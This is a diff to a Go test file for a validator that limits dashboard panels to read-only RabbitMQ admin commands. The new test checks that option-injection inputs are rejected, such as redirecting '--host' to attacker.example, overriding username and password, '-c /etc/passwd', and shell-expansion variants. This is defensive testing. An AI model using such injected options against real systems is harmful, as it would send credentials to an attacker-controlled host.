@@ -20,6 +20,9 @@ func TestValidatePanelCommand_AllowsReadOnlyCommands(t *testing.T) {
 		{DatasourceRabbitMQ, "list queues"},
 		{DatasourceRabbitMQ, "list queues name messages consumers"},
 		{DatasourceRabbitMQ, "show overview"},
+		{DatasourceRabbitMQ, "list queues name message_stats.publish_details.rate"},
+		{DatasourceRabbitMQ, "list operator_policies"},
+		{DatasourceRabbitMQ, "list policies vhost name pattern apply-to definition priority"},
 	}
 	for _, tc := range cases {
 		if err := ValidatePanelCommand(tc.datasource, tc.command); err != nil {
@@ -53,6 +56,31 @@ func TestValidatePanelCommand_RejectsWrites(t *testing.T) {
 	for _, tc := range cases {
 		if err := ValidatePanelCommand(tc.datasource, tc.command); err == nil {
 			t.Errorf("%s %q: expected rejection, got nil", tc.datasource, tc.command)
+		}
+	}
+}
+
+// The command is appended after the credentialed rabbitmqadmin prefix, and
+// rabbitmqadmin keeps the last value of a repeated option, so any option in a
+// panel could point the connection — and its credentials — somewhere else.
+func TestValidatePanelCommand_RabbitMQRejectsOptions(t *testing.T) {
+	for _, cmd := range []string{
+		"list queues --host=attacker.example",
+		"list queues --host attacker.example",
+		"list queues -H attacker.example",
+		"show overview --port=80",
+		"list queues name --username=x --password=y",
+		"list queues --ssl",
+		"list queues -c /etc/passwd",
+		"list -N other",
+		// Shell expansion could turn these into options after validation.
+		"list queues {--host,attacker.example}",
+		"list queues ?-host=attacker.example",
+		"list queues [-]-host=attacker.example",
+		"list queues ~",
+	} {
+		if err := ValidatePanelCommand(DatasourceRabbitMQ, cmd); err == nil {
+			t.Errorf("%q: expected rejection, got nil", cmd)
 		}
 	}
 }
